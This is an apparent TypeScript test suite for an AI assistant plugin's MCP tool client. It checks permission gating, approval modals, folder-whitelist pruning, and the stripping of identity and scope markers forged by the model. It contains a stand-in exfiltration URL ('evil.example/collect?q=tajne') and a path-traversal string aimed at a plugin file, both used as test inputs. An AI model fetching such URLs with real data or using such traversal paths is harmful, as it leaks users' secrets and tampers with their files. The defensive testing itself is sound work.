import test from 'ava';
import { MCPClient } from './MCPClient.js';
import type { MCPClientApp, MCPClientPlugin, MCPToolRegistryLike, ToolCallArgs } from './MCPClient.js';
import type { PermissionedAgent } from '../../core/index.js';

/** Ksztalt wyniku, na ktory patrza testy post-filtra whitelisty (krok 7 w kliencie). */
interface SearchToolResult {
    success?: boolean;
    scope?: string;
    results?: Array<{ path: string; excerpt?: string }>;
    files?: Array<{ path: string; excerpt?: string }>;
    count?: number;
}

// Atrapy sa celowo niepelne (test sprawdza JEDEN mechanizm) — stad rzutowania na kontrakty klienta.
const asApp = (app: unknown) => app as unknown as MCPClientApp;
const asPlugin = (plugin: unknown) => plugin as unknown as MCPClientPlugin;
const asRegistry = (registry: unknown) => registry as unknown as MCPToolRegistryLike;

test('normalizeArgsAliases: returns args unchanged when no aliases present', t => {
    const args = { path: 'foo.md', text: 'hello' };
    const out = MCPClient.normalizeArgsAliases(args, 'test_tool');
    t.deepEqual(out, args);
});

test('normalizeArgsAliases: image_path → path (canonical wins)', t => {
    const out = MCPClient.normalizeArgsAliases({ image_path: 'pic.png', text: 'hi' }, 'add_text_to_image');
    t.is(out.path, 'pic.png');
    t.is(out.image_path, 'pic.png'); // legacy preserved (zero breaking)
});

test('normalizeArgsAliases: file/filepath → path', t => {
    t.is(MCPClient.normalizeArgsAliases({ file: 'a.md' }, 'x').path, 'a.md');
    t.is(MCPClient.normalizeArgsAliases({ filepath: 'b.md' }, 'x').path, 'b.md');
});

test('normalizeArgsAliases: dir/directory → folder', t => {
    t.is(MCPClient.normalizeArgsAliases({ dir: 'Notes' }, 'x').folder, 'Notes');
    t.is(MCPClient.normalizeArgsAliases({ directory: 'Projects' }, 'x').folder, 'Projects');
});

test('normalizeArgsAliases: pattern → glob', t => {
    t.is(MCPClient.normalizeArgsAliases({ pattern: '**/*.md' }, 'x').glob, '**/*.md');
});

test('normalizeArgsAliases: canonical present → does NOT overwrite', t => {
    const out = MCPClient.normalizeArgsAliases({ path: 'real.md', image_path: 'fake.png' }, 'x');
    t.is(out.path, 'real.md');
    t.is(out.image_path, 'fake.png');
});

test('normalizeArgsAliases: handles null/non-object gracefully', t => {
    const junk = (value: unknown) => value as unknown as ToolCallArgs;
    t.is(MCPClient.normalizeArgsAliases(junk(null), 'x'), junk(null));
    t.is(MCPClient.normalizeArgsAliases(junk(undefined), 'x'), junk(undefined));
    t.deepEqual(MCPClient.normalizeArgsAliases(junk([]), 'x'), junk([]));
});

test('normalizeArgsAliases: multiple aliases at once', t => {
    const out = MCPClient.normalizeArgsAliases({
        image_path: 'a.png',
        dir: 'Notes',
        pattern: '**/*.md',
        text: 'literal'
    }, 'x');
    t.is(out.path, 'a.png');
    t.is(out.folder, 'Notes');
    t.is(out.glob, '**/*.md');
    t.is(out.text, 'literal');
});

test('executeToolCall: maps smoke 05 built-in tools to known action types', async t => {
    const expectedActions = {
        ask_user: 'vault.read',
        add_text_to_image: 'image.generate',
        vault_filter_yaml: 'vault.read',
        vault_grep: 'vault.read',
        vault_links: 'vault.read',
        vault_semantic: 'vault.read',
        vault_glob: 'vault.read',
        memory_filter_yaml: 'vault.read',
        memory_grep: 'vault.read',
        memory_links: 'vault.read',
        memory_semantic: 'vault.read',
        // S28 (D3): trzy prymitywy poczty zamiast 12 narzędzi Project Huba.
        kom_send: 'agent.message',
        kom_list: 'vault.read',
        kom_read: 'vault.read',
        // E2.9 artefakty żywe — muszą mapować na znane akcje (inaczej checkPermission fail-close → DENY).
        artifact_create: 'artifact.create',
        artifact_read: 'artifact.read',
        artifact_update: 'artifact.update',
        artifact_list: 'artifact.read',
    };
    const checkedActions: string[] = [];
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: {
            getAgent: () => ({ name: 'Jaskier' }),
            getActiveAgent: () => ({ name: 'Jaskier' }),
        },
        permissionSystem: {
            checkPermission: (_agent: unknown, action: string) => {
                checkedActions.push(action);
                return { allowed: true, requiresApproval: false };
            },
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async () => ({ success: true }),
        }),
    }));

    for (const [name, expectedAction] of Object.entries(expectedActions)) {
        const result = await client.executeToolCall({ name, arguments: {} }, 'Jaskier') as SearchToolResult;
        t.true(result.success);
        t.is(checkedActions.at(-1), expectedAction);
    }

    t.false(checkedActions.includes('unknown'));
});

// ─── E2.8 A7: przycinanie wyników search/list whitelistą agenta (MCPClient post-filter) ───
//
// Kontrakt (MCPClient.js po wykonaniu narzędzia): dla `search`/`list` scope≠memory wyniki
// są przycinane przez AccessGuard.filterResults do przypisanych folderów agenta (gdy tryb
// twardy = guidance_mode OFF). scope=memory nie jest przycinane; guidance ON nie przycina.
// To pierwszy test tego scenariusza (rekonesans #2: filtr żywy od E2.5/E2.6, brak testu).

function _makeSearchClient(agent: PermissionedAgent, toolResult: SearchToolResult) {
    return new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            // Klon per wywołanie — post-filter mutuje wynik.
            execute: async () => JSON.parse(JSON.stringify(toolResult)),
        }),
    }));
}

const _hardAgent = {
    name: 'ProjectAgent',
    focusFolders: [{ path: 'ProjectX', access: 'readwrite' }],
    permissions: { guidance_mode: false, mcp: true, read_notes: true, memory: true },
};
const _mixedResults = [
    { path: 'ProjectX/note1.md', excerpt: 'in' },
    { path: 'OtherFolder/note2.md', excerpt: 'out' },
    { path: 'ProjectX/sub/note3.md', excerpt: 'in' },
];

test('executeToolCall: search results pruned to assigned folders (guidance OFF)', async t => {
    const client = _makeSearchClient(_hardAgent, { success: true, scope: 'vault', results: _mixedResults });
    const result = await client.executeToolCall({ name: 'search', arguments: { query: 'x' } }, 'ProjectAgent') as SearchToolResult;
    t.true(result.success);
    const paths = result.results!.map(r => r.path).sort();
    t.deepEqual(paths, ['ProjectX/note1.md', 'ProjectX/sub/note3.md']);
    t.false(paths.includes('OtherFolder/note2.md'));
    t.is(result.count, 2);
});

test('executeToolCall: list result.files pruned to assigned folders (guidance OFF)', async t => {
    const client = _makeSearchClient(_hardAgent, { success: true, scope: 'vault', files: _mixedResults });
    const result = await client.executeToolCall({ name: 'list', arguments: { folder: '' } }, 'ProjectAgent') as SearchToolResult;
    t.true(result.success);
    const paths = result.files!.map(r => r.path).sort();
    t.deepEqual(paths, ['ProjectX/note1.md', 'ProjectX/sub/note3.md']);
    t.is(result.count, 2);
});

test('executeToolCall: scope=memory search is NOT pruned by vault whitelist', async t => {
    const client = _makeSearchClient(_hardAgent, { success: true, scope: 'memory', results: _mixedResults });
    const result = await client.executeToolCall({ name: 'search', arguments: { query: 'x', scope: 'memory' } }, 'ProjectAgent') as SearchToolResult;
    t.true(result.success);
    t.is(result.results!.length, 3); // własna pamięć agenta — nie tnie się whitelistą vaulta
});

test('executeToolCall: guidance ON (soft mode) does NOT prune search results', async t => {
    const softAgent = {
        name: 'SoftAgent',
        focusFolders: [{ path: 'ProjectX', access: 'readwrite' }],
        permissions: { guidance_mode: true, mcp: true, read_notes: true, memory: true },
    };
    const client = _makeSearchClient(softAgent, { success: true, scope: 'vault', results: _mixedResults });
    const result = await client.executeToolCall({ name: 'search', arguments: { query: 'x' } }, 'SoftAgent') as SearchToolResult;
    t.true(result.success);
    t.is(result.results!.length, 3); // tryb miękki: foldery to wskazówka, wyniki nietknięte
});

// E2.1: parseToolCalls deleguje do kanonu (modules/agent-loop). Publiczne API bez zmian.
test('parseToolCalls: deleguje do kanonu — choices shape zachowany', (t) => {
    const registry = {
        getAllToolNames: () => ['vault_read'],
        getTool: (n: string) => (n === 'vault_read' ? { name: n } : null)
    };
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry(registry));
    const calls = client.parseToolCalls({ choices: [{ message: { tool_calls: [
        { id: 'c1', function: { name: 'vault_read', arguments: '{"path":"a.md"}' } }
    ] } }] });
    t.is(calls.length, 1);
    t.is(calls[0].name, 'vault_read');
    t.is(calls[0].id, 'c1');
    t.is(calls[0].arguments, '{"path":"a.md"}');
});

test('parseToolCalls: odskleja DeepSeek concat używając registry (getTool + getAllToolNames)', (t) => {
    const registry = {
        getAllToolNames: () => ['minion_task'],
        getTool: (n: string) => (n === 'minion_task' ? { name: n } : null)
    };
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry(registry));
    const calls = client.parseToolCalls({ choices: [{ message: { tool_calls: [
        { id: 'c', function: { name: 'minion_taskminion_task', arguments: '{"a":1}{"b":2}' } }
    ] } }] });
    t.is(calls.length, 2);
    t.deepEqual(calls.map((c) => c.name), ['minion_task', 'minion_task']);
    t.is(calls[0].arguments, '{"a":1}');
    t.is(calls[1].arguments, '{"b":2}');
});

// ─── E3.1 R4: external tool approval seam ───────────────────────────
// targetPath MUST stay empty (AccessGuard sees no pseudo-path) while a distinct
// approvalTarget (prefixed tool name) drives the per-tool "always" rule.
function makeClientWithExternal() {
    const toolRegistry = {
        getTool: (name: string) => name === 'blender__execute_code'
            ? { name, serverName: 'blender', source: 'user', description: '[Blender] Run code' }
            : null,
    };
    const plugin = { externalMcpManager: { isExternalTool: (n: string) => n === 'blender__execute_code' } };
    return new MCPClient(asApp({}), asPlugin(plugin), asRegistry(toolRegistry));
}

test('R4: _extractToolContext external tool → empty targetPath (AccessGuard safe) + approvalTarget = prefixed name', t => {
    const client = makeClientWithExternal();
    const { targetPath, approvalContext } = client._extractToolContext('blender__execute_code', { code: 'x' }, 'Jaskier');
    t.is(targetPath, '', 'no pseudo-path reaches checkPermission/AccessGuard');
    t.is(approvalContext.approvalTarget, 'blender__execute_code', 'per-tool always-approve key');
    t.is(approvalContext.externalServer, 'blender');
});

test('R4: non-external tools are unaffected (no approvalTarget injected)', t => {
    const client = makeClientWithExternal();
    const { targetPath, approvalContext } = client._extractToolContext('web_search', { query: 'cats' }, 'Jaskier');
    t.is(targetPath, 'cats');
    t.is(approvalContext.approvalTarget, undefined);
    t.is(approvalContext.externalArgs, undefined, 'args preview is external-only');
});

// S33 Z3: modal approvalu dostaje PEŁNE argumenty wywołania (user widzi, co leci do cudzego
// serwera), ale BEZ naszych znaczników wewnętrznych.
test('S33 Z3: external tool approval context carries full call arguments', t => {
    const client = makeClientWithExternal();
    const { approvalContext } = client._extractToolContext(
        'blender__execute_code',
        { code: 'print(1)', scene: { name: 'main', frames: 24 } },
        'Jaskier'
    );
    t.deepEqual(approvalContext.externalArgs, { code: 'print(1)', scene: { name: 'main', frames: 24 } });
    // approvalTarget/targetPath — mechanika „zawsze zezwalaj" NIETKNIĘTA.
    t.is(approvalContext.approvalTarget, 'blender__execute_code');
});

test('S33 Z3: _invocation* markers never reach the approval args preview', t => {
    const client = makeClientWithExternal();
    const { approvalContext } = client._extractToolContext(
        'blender__execute_code',
        { code: 'x', _invocationAgentName: 'Jaskier', _invocationDelegationDepth: 2 },
        'Jaskier'
    );
    t.deepEqual(approvalContext.externalArgs, { code: 'x' });
    t.false('_invocationAgentName' in (approvalContext.externalArgs as object));
    t.false('_invocationDelegationDepth' in (approvalContext.externalArgs as object));
});

// ─── F2 „delegacja w tle": przelot adresu zwrotnego (`opts.origin` → `_invocationOrigin`) ───
//
// Wzorzec ten sam co `_invocationAgentName`/`_invocationDelegationDepth`: klient NICZEGO
// nie buduje, tylko wstrzykuje do args to, co dostał od wołacza. Brak opcji = pole USUWANE,
// żeby model nie podrobił cudzej sesji jako adresu zwrotnego powiadomienia.

/** Klient, który zapamiętuje args, z jakimi realnie wykonano narzędzie. */
function _makeArgsSpyClient(seen: ToolCallArgs[]) {
    return new MCPClient(asApp(null), asPlugin({
        agentManager: {
            getAgent: () => ({ name: 'Jaskier' }),
            getActiveAgent: () => ({ name: 'Jaskier' }),
        },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async (args: ToolCallArgs) => { seen.push(args); return { success: true }; },
        }),
    }));
}

test('executeToolCall: opts.origin wstrzykiwany do args jako _invocationOrigin', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgsSpyClient(seen);
    const origin = { agentName: 'Jaskier', sessionPath: 'Czaty/jaskier.md', tabKey: 'tab-1' };

    await client.executeToolCall({ name: 'delegate', arguments: { task: 'x' } }, 'Jaskier', { origin });

    t.deepEqual(seen[0]._invocationOrigin, origin);
    t.is(seen[0]._invocationAgentName, 'Jaskier', 'dotychczasowy znacznik tożsamości bez zmian');
});

test('executeToolCall: bez opts.origin pole _invocationOrigin jest USUWANE z args modelu', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgsSpyClient(seen);

    await client.executeToolCall(
        { name: 'delegate', arguments: { task: 'x', _invocationOrigin: { agentName: 'Klara', tabKey: 'cudza' } } },
        'Jaskier',
    );

    t.false('_invocationOrigin' in seen[0], 'model nie podstawi sobie adresu zwrotnego z palca');
});

test('executeToolCall: origin bez agentName jest ignorowany (fail-closed)', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgsSpyClient(seen);

    await client.executeToolCall({ name: 'delegate', arguments: { task: 'x' } }, 'Jaskier',
        { origin: { tabKey: 'tab-1' } as unknown as { agentName: string } });

    t.false('_invocationOrigin' in seen[0]);
});

// ─── K11 (AUD-security-008/072): zakres i whitelista WOŁAJĄCEGO jako zaufane znaczniki ───
//
// Wzorzec ten sam co `_invocationDelegationDepth`: wartość wstrzykuje runtime, a gdy jej nie ma,
// pole jest USUWANE z argumentów — inaczej model podstawiłby sobie szerszy zakres z palca.

function _makeArgSpyClient(seen: ToolCallArgs[]) {
    const agent = { name: 'Tester', permissions: { guidance_mode: true } };
    return new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async (args: ToolCallArgs) => { seen.push(args); return { success: true }; },
        }),
    }));
}

test('K11: scopeFolders + callerToolNames wstrzykiwane do args jako znaczniki _invocation*', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgSpyClient(seen);

    await client.executeToolCall({ name: 'delegate', arguments: { task: 'x' } }, 'Tester', {
        delegationDepth: 1,
        scopeFolders: ['Publiczne'],
        callerToolNames: ['read', 'delegate'],
    });

    t.deepEqual(seen[0]._invocationScopeFolders, ['Publiczne']);
    t.deepEqual(seen[0]._invocationToolNames, ['read', 'delegate']);
});

// ─── K21 (AUD-security-103): BRAMKA ogląda worek PO nadpisaniu znaczników ────────────────
//
// `executeToolCall` budował `argsWithContext` (zaufane `_invocation*` od runtime'u), ale do
// `_extractToolContext` podawał worek SPRZED nadpisania. Każdy `contextExtractor`, który czyta
// stamtąd tożsamość — a robi to rodzina `artifact_*` — dostawał wartość wpisaną przez MODEL.
// Bramka oceniała wtedy inny cel, niż ten, do którego pisało `execute` (dostające już worek
// zaufany). Poprawka jest jednolinijkowa i obejmuje WSZYSTKIE narzędzia naraz.

test('K21: contextExtractor dostaje znaczniki _invocation* z runtime, nie od modelu', async t => {
    const widziane: ToolCallArgs[] = [];
    const agent = { name: 'Klara', permissions: { guidance_mode: true } };
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            contextExtractor: (args: ToolCallArgs) => { widziane.push(args); return { targetPath: '' }; },
            execute: async () => ({ success: true }),
        }),
    }));

    await client.executeToolCall(
        { name: 'delegate', arguments: { task: 'x', _invocationAgentName: 'Wspolne' } },
        'Klara',
        { scopeFolders: ['Publiczne'] },
    );

    t.is(widziane[0]._invocationAgentName, 'Klara', 'bramka nie ma prawa zobaczyć nazwy od modelu');
    t.deepEqual(widziane[0]._invocationScopeFolders, ['Publiczne'], 'zakres też jest ten z runtime');
});

test('K11: bez opcji znaczniki są USUWANE, nawet gdy model poda je sam', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgSpyClient(seen);

    await client.executeToolCall({
        name: 'delegate',
        arguments: { task: 'x', _invocationScopeFolders: ['/'], _invocationToolNames: ['write', 'delete'] },
    }, 'Tester');

    t.false('_invocationScopeFolders' in (seen[0] as Record<string, unknown>));
    t.false('_invocationToolNames' in (seen[0] as Record<string, unknown>));
});

// ─── K11 (AUD-security-020): `action` nie obniża ryzyka `write` poniżej skutku ────────────
//
// `write {path, content, action:'create'}` BEZ pola `mode`: klasyfikator widział YELLOW
// (wyciszany żółtym przełącznikiem `vault_write`), a `WriteTool` liczył `args.mode || 'replace'`
// i NADPISYWAŁ istniejący plik — czyli operację, którą autonomia `edge` deklaruje jako RED
// nie do wyłączenia przełącznikiem.

test('K11 020: write z action:create przy wyłączonym toggle vault_write NADAL pyta (RED)', async t => {
    const { PermissionSystem } = await import('../../core/index.js');
    const asked: Array<Record<string, unknown>> = [];
    const seenArgs: ToolCallArgs[] = [];
    const agent = {
        name: 'Tester',
        permissions: { guidance_mode: true },
        // user świadomie zdjął ŻÓŁTY przełącznik — czerwone i tak ma pytać
        approvalToggles: { vault_write: false },
    };
    // Atrapa vaulta potrzebna tylko po to, żeby blok podglądu diffa (6b) miał co przeczytać.
    const app = { vault: { getAbstractFileByPath: () => null, adapter: { exists: async () => false } } };
    const client = new MCPClient(asApp(app), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: new PermissionSystem({}, {}),
        approvalManager: {
            requestApproval: async (req: Record<string, unknown>) => { asked.push(req); return true; },
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            contextExtractor: (args: ToolCallArgs) => ({ targetPath: args.path || '' }),
            execute: async (args: ToolCallArgs) => { seenArgs.push(args); return { success: true }; },
        }),
    }),
    // Podgląd diffa nie jest przedmiotem tego testu, ale blok 6b po niego sięga — bez atrapy
    // klient otworzyłby prawdziwy modal, który poza Obsidianem nigdy się nie zamyka (test
    // wisiałby do timeoutu). Atrapa zatwierdza od ręki, bramka approvalu zostaje nietknięta.
    { diffModalFactory: () => ({ waitForApproval: async () => 'approve' }) });

    await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/umowa.md', content: 'x', action: 'create' } },
        'Tester',
        { autonomy: 'edge' },
    );
    t.is(asked.length, 1, 'brak modala = nadpisanie bez pytania');
    t.is(seenArgs[0].mode, undefined, '`action` NIE jest trybem zapisu — narzędzie i tak zrobi replace');
    t.is(asked[0].operationMode, null, 'modal nie udaje trybu, którego narzędzie nie zna');

    // Kontrola negatywna: prawdziwy `mode:create` to nadal YELLOW, więc toggle go wycisza.
    asked.length = 0;
    await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/nowa.md', content: 'x', mode: 'create' } },
        'Tester',
        { autonomy: 'edge' },
    );
    t.is(asked.length, 0, 'YELLOW z wyłączonym togglem nie pyta — zachowanie bez zmian');
});

// ─── K11 (AUD-security-069): web_read ma WŁASNĄ bramkę zgody ─────────────────────────────
//
// Do K11 `web_read` mapował się na akcję `web.search` i na ten sam przełącznik profilu, więc
// jedno odklikanie „Wyszukiwanie w internecie" zdejmowało pytanie także z wyjścia na adres
// wskazany przez model, a modal (gdy się pokazywał) ogłaszał pobranie strony jako wyszukiwanie.

async function _makeWebClient(agent: Record<string, unknown>, asked: Array<Record<string, unknown>>) {
    const { PermissionSystem } = await import('../../core/index.js');
    return new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: new PermissionSystem({}, {}),
        approvalManager: {
            requestApproval: async (req: Record<string, unknown>) => { asked.push(req); return true; },
        },
    }), asRegistry({
        getTool: (name: string) => ({ name, description: name, execute: async () => ({ success: true }) }),
    }));
}

test('K11 069: wyciszony web_search NIE otwiera web_read (osobny przełącznik, domyślnie pytaj)', async t => {
    const asked: Array<Record<string, unknown>> = [];
    const agent = {
        name: 'Tester',
        permissions: { guidance_mode: true },
        approvalToggles: { web_search: false },
    };
    const client = await _makeWebClient(agent, asked);

    await client.executeToolCall({ name: 'web_search', arguments: { query: 'kot' } }, 'Tester', { autonomy: 'edge' });
    t.is(asked.length, 0, 'wyszukiwarka wyciszona zgodnie z wolą usera');

    await client.executeToolCall(
        { name: 'web_read', arguments: { url: 'https://evil.example/collect?q=tajne' } }, 'Tester', { autonomy: 'edge' });
    t.is(asked.length, 1, 'pobranie adresu ma własną zgodę');
    t.is(asked[0].type, 'web.read', 'osobny typ akcji — reguła „zawsze zezwalaj" też jest osobna');
    t.is(asked[0].targetPath, 'https://evil.example/collect?q=tajne');
});

test('K11 069: własny przełącznik web_read wycisza TYLKO web_read', async t => {
    const asked: Array<Record<string, unknown>> = [];
    const agent = {
        name: 'Tester',
        permissions: { guidance_mode: true },
        approvalToggles: { web_read: false },
    };
    const client = await _makeWebClient(agent, asked);

    await client.executeToolCall({ name: 'web_read', arguments: { url: 'https://ok.example/' } }, 'Tester', { autonomy: 'edge' });
    t.is(asked.length, 0);

    await client.executeToolCall({ name: 'web_search', arguments: { query: 'kot' } }, 'Tester', { autonomy: 'edge' });
    t.is(asked.length, 1, 'web_search ma default „pytaj" i nie dziedziczy wyciszenia web_read');
});

// ─── K11 (AUD-security-051): modal pokazuje TĘ nazwę pliku, która realnie powstanie ──────

test('K11 051: ścieżka memory_save w modalu liczona tą samą regułą co zapis', async t => {
    const { makeMemoryNoteFilename } = await import('../memory/index.js');
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry({ getTool: () => null }));
    const nazwa = 'Ważne hasło do księgowości';

    const ctx = (client as unknown as {
        _extractToolContext(tool: string, args: ToolCallArgs, agent: string | null): { targetPath: string };
    })._extractToolContext('memory_save', { name: nazwa, type: 'reference', content: 'x' }, 'Jaskier');

    const oczekiwany = makeMemoryNoteFilename('reference', nazwa);
    t.true(ctx.targetPath.endsWith(`/${oczekiwany}`),
        `modal: ${ctx.targetPath}\nna dysk: .../${oczekiwany}`);
    // Konkretnie: diakrytyki są ZDEJMOWANE, nie zamieniane na podkreślenia.
    t.true(ctx.targetPath.includes('wazne'), ctx.targetPath);
});

// ─── AUD-testy-060: memory_delete approvalContext niesie TREŚĆ kasowanego faktu ──────────
//
// Analogicznie do K11 051 wyżej (memory_save): `MemoryDeleteTool.ts` NIE definiuje
// `contextExtractor`, więc `memory_delete` ląduje w tym samym fallback-switchu w produkcji.
// `memory_delete` jest w `MEMORY_TOOLS` (executeToolCall pomija dla niego `checkPermission`),
// więc `targetPath`/`approvalContext` z tej gałęzi trafiają WYŁĄCZNIE do okna zgody, które user
// widzi tuż przed potwierdzeniem kasacji. Mutacja zerująca `approvalContext.memoryContent`/
// `memorySection` (np. literówka przy refaktorze) zostawiałaby okno zgody z pustym cudzysłowem
// zamiast treści faktu, który user właśnie ma zatwierdzić do skasowania z `brain.md` — bez
// żadnego testu, który by to złapał.

test('AUD-testy-060: _extractToolContext memory_delete — approvalContext niesie fakt/sekcję do okna zgody', t => {
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry({ getTool: () => null }));
    const fakt = 'Kuba nie pije kawy po 15';

    const ctx = client._extractToolContext('memory_delete', { fact: fakt, section: 'nawyki' }, 'Jaskier');

    t.is(ctx.targetPath, '.pkm-assistant/agents/jaskier/memory/brain.md');
    // Poprzeczka MUTACYJNA: `approvalContext.memoryContent = '';` (gubi treść) MUSI tu polec —
    // fakt jest niepusty i konkretny, więc pusty string albo `undefined` nie przejdzie.
    t.is(ctx.approvalContext.memoryContent, fakt, 'user w oknie zgody ma zobaczyć TREŚĆ kasowanego faktu, nie pusty cudzysłów');
    t.is(ctx.approvalContext.memorySection, 'nawyki');
});

test('AUD-testy-060: memory_delete approvalContext — brak fact/section daje bezpieczny pusty string (nie undefined)', t => {
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry({ getTool: () => null }));
    const ctx = client._extractToolContext('memory_delete', {}, 'Jaskier');

    t.is(ctx.approvalContext.memoryContent, '');
    t.is(ctx.approvalContext.memorySection, '');
});

// ─── AUD-testy-059: delegate — treść zadania NIE jest walidowana jak ścieżka vaultowa ────
//
// `case 'delegate'` w `_extractToolContext` oddaje bramce PUSTY cel (komentarz w źródle:
// „sub-agent task is NOT a vault path, skip AccessGuard") — ŚWIADOMIE, bo `delegate` siedzi
// w `NON_VAULT_TARGET_ACTIONS` (core/security/PermissionSystem.ts, K14): jego „cel" to opis
// zadania dla sub-agenta, nie ścieżka. Pin: nawet gdy treść zadania WYGLĄDA jak ścieżka do
// strefy zakazanej (No-Go/protected/traversal), ekstrakcja NIE próbuje jej sanityzować ani
// kanonizować jako ścieżkę — inaczej fałszywa odmowa delegacji zależałaby od tego, co model
// akurat wpisał w opis zadania (dokładnie klasa błędu, którą K2 wyciął dla `generate_image`).

test('AUD-testy-059: _extractToolContext delegate — treść zadania jak ścieżka NIE jest walidowana jak ścieżka vaultowa', t => {
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry({ getTool: () => null }));
    // Naraz: traversal + No-Go (.obsidian) + protected (.pkm-assistant) — gdyby to poleciało
    // do sanitizePath/AccessGuard jako cel, WSZYSTKIE trzy bramki by odmówiły.
    const zadanie = '../../.pkm-assistant/../.obsidian/plugins/evil/main.js';

    const ctx = client._extractToolContext('delegate', { task: zadanie, aspect: 'analiza' }, 'Jaskier');

    t.is(ctx.targetPath, '', 'delegate NIE oddaje treści zadania jako celu — sub-agent task to nie ścieżka vaultowa');
    t.falsy(ctx.invalidPath, 'treść zadania nie przechodzi przez sanityzację ścieżek — nie ma jak "nie dać się uratować"');
    t.is(ctx.approvalContext.delegateTask, zadanie, 'user w oknie zgody nadal widzi PEŁNĄ treść zadania');
});

test('AUD-testy-059: executeToolCall delegate — checkPermission dostaje PUSTY targetPath niezależnie od treści zadania (brak fałszywej odmowy)', async t => {
    const seenChecks: Array<{ action: string; targetPath: string }> = [];
    const seenArgs: ToolCallArgs[] = [];
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: {
            getAgent: () => ({ name: 'Jaskier' }),
            getActiveAgent: () => ({ name: 'Jaskier' }),
        },
        permissionSystem: {
            checkPermission: (_agent: unknown, action: string, targetPath: string) => {
                seenChecks.push({ action, targetPath });
                return { allowed: true, requiresApproval: false };
            },
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async (args: ToolCallArgs) => { seenArgs.push(args); return { success: true, started: true }; },
        }),
    }));

    const zadanie = '.obsidian/plugins/evil/main.js'; // wygląda jak No-Go, gdyby poleciało jako ścieżka
    const result = await client.executeToolCall({ name: 'delegate', arguments: { task: zadanie } }, 'Jaskier') as { success?: boolean };

    t.true(result.success, 'delegacja NIE ma prawa polec przez to, że treść zadania przypomina zakazaną ścieżkę');
    t.is(seenChecks.length, 1);
    t.is(seenChecks[0].action, 'delegate');
    t.is(seenChecks[0].targetPath, '', 'bramka dostaje pusty cel — to ONA (poprzez non-vault-target) wie, że to nie ścieżka');
    t.is(seenArgs[0].task, zadanie, 'narzędzie samo dostaje oryginalną treść zadania (bez okrojenia)');
});

// ─── AUD-bledy-027/058/025: JEDEN kształt porażki narzędzia ──────────────────────────────
//
// Narzędzia wbudowane sygnalizują porażkę przez `{success:false, error}`, a MCPClient/artefakty/
// wrapper external MCP przez `{isError:true}`. Warstwa prezentacji czatu znała TYLKO `isError`,
// więc nieudany zapis rysował się jako sukces z linkiem do pliku, którego nie ma. Normalizacja
// siedzi w JEDNYM miejscu — tutaj, na wyjściu z `executeToolCall`.

/** Zwrotka narzędzia widziana przez te testy: obie flagi + komunikat. */
interface FailingToolResult {
    isError?: boolean;
    success?: boolean;
    error?: string;
    path?: string;
}

function _makeNormalizingClient(execute: () => Promise<unknown>) {
    return new MCPClient(asApp(null), asPlugin({
        agentManager: {
            getAgent: () => ({ name: 'Jaskier' }),
            getActiveAgent: () => ({ name: 'Jaskier' }),
        },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({ name, description: name, execute }),
    }));
}

test('AUD-bledy-027: narzędzie z {success:false} dostaje isError na wyjściu z klienta', async t => {
    const client = _makeNormalizingClient(async () => ({ success: false, error: 'Plik już istnieje' }));

    const result = await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/a.md', content: 'x' } }, 'Jaskier') as FailingToolResult;

    t.true(result.isError, 'po tej fladze czat liczy status chipa i warunek linku „otwórz zapisany plik"');
});

test('AUD-bledy-058: normalizacja NIE kasuje oryginalnych pól narzędzia', async t => {
    const client = _makeNormalizingClient(async () => ({ success: false, error: 'Plik już istnieje', path: 'Notatki/a.md' }));

    const result = await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/a.md' } }, 'Jaskier') as FailingToolResult;

    t.is(result.success, false, 'testy narzędzi i formatToolOutput dalej czytają `success`');
    t.is(result.error, 'Plik już istnieje');
    t.is(result.path, 'Notatki/a.md');
});

test('AUD-bledy-025: udany wynik NIE dostaje isError (pusty wynik to sukces, nie porażka)', async t => {
    const client = _makeNormalizingClient(async () => ({ success: true, results: [], count: 0 }));

    const result = await client.executeToolCall(
        { name: 'web_search', arguments: { query: 'kot' } }, 'Jaskier') as FailingToolResult;

    t.is(result.isError, undefined, 'zero wyników to PUSTY WYNIK, nie awaria narzędzia');
});

